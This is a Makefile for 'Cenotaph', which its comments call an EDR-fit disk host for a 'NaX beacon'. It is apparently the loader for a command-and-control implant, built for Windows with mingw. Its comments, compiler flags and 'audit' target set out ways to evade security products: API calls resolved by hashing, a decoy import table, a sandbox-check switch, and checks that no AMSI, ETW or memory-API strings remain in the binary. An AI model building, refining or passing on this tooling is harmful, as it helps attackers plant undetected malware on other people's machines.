# Cenotaph — EDR-fit disk host for the NaX beacon.
#
# Cross-compiled on Linux with mingw-w64.  Cenotaph is a *normal* native PE
# (not PIC shellcode), built with no CRT: -nostdlib + an explicit entry
# point.  The only linked import lib is kernel32, for two/three mundane
# IAT imports (GetTickCount, Sleep, CloseHandle).  Everything functional
# is PEB-walked via FNV1a at runtime — no API name strings in the binary.
#
#   make          -> cenotaph.exe       (release, windows subsystem)
#   make debug     -> cenotaph-debug.exe (console subsystem, for testing)
#   make audit     -> strings + IAT + undefined-symbol checks
#   make clean

CXX      := x86_64-w64-mingw32-g++
STRIP    := x86_64-w64-mingw32-strip
OBJCOPY  := x86_64-w64-mingw32-objcopy
READELF  := x86_64-w64-mingw32-readelf
NM       := x86_64-w64-mingw32-nm

SRC      := src/Ldr.c src/Utils.c src/Host.c
INC      := -Iinclude
OBJDIR   := build

# C++ for constexpr FNV1a hashing (HASH_STR -> compile-time, no name strings).
CFLAGS   := -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti \
            -fno-builtin -fno-ident -fno-stack-protector -fpack-struct=8 \
            -mno-sse -fpermissive -masm=intel $(INC)

# No CRT.  Explicit entry.  Only kernel32 is linked (mundane IAT imports).
LDFLAGS  := -nostdlib -lkernel32 -Wl,-e,CenotaphEntry -Wl,-s

OBJ      := $(OBJDIR)/Ldr.o $(OBJDIR)/Utils.o $(OBJDIR)/Host.o

.PHONY: all debug audit clean

all: $(OBJDIR) cenotaph.exe

debug: CFLAGS += -DCENOTAPH_SANDBOX_CHECK=0 -g
debug: LDFLAGS := -nostdlib -lkernel32 -Wl,-e,CenotaphEntry -Wl,-subsystem,console
debug: $(OBJDIR) cenotaph-debug.exe

$(OBJDIR):
	mkdir -p $(OBJDIR)

$(OBJDIR)/%.o: src/%.c
	$(CXX) $(CFLAGS) -c $< -o $@

cenotaph.exe: $(OBJ)
	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS) -Wl,-subsystem,windows
	$(STRIP) $@ 2>/dev/null || true

cenotaph-debug.exe: $(OBJ)
	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS)

# ---- audit: prove no API name strings, minimal IAT, clean undefineds ----
audit: cenotaph.exe
	@echo "=== size ==="; ls -l cenotaph.exe | awk '{print $$5" bytes"}'
	@echo "=== API-name string scan (must be EMPTY) ==="; \
	  strings -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtQuerySystem|TpAllocWork|TpPostWork|TpReleaseWork|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|AmsiScan|EtwEvent' || echo "(empty — PASS)"
	@echo "=== IAT imports (should be only mundane kernel32: GetTickCount/Sleep/CloseHandle) ==="; \
	  $(OBJCOPY) -O binary --only-section=.idata cenotaph.exe /dev/stdout 2>/dev/null | strings | sort -u || true
	@echo "=== undefined symbols (must be empty: no CRT, no bare libc) ==="; \
	  $(NM) -u cenotaph.exe 2>/dev/null || echo "(none)"
	@echo "=== entry point ==="; \
	  $(READELF) -h cenotaph.exe 2>/dev/null | grep -i 'Entry point' || true

clean:
	rm -rf $(OBJDIR) cenotaph.exe cenotaph-debug.exe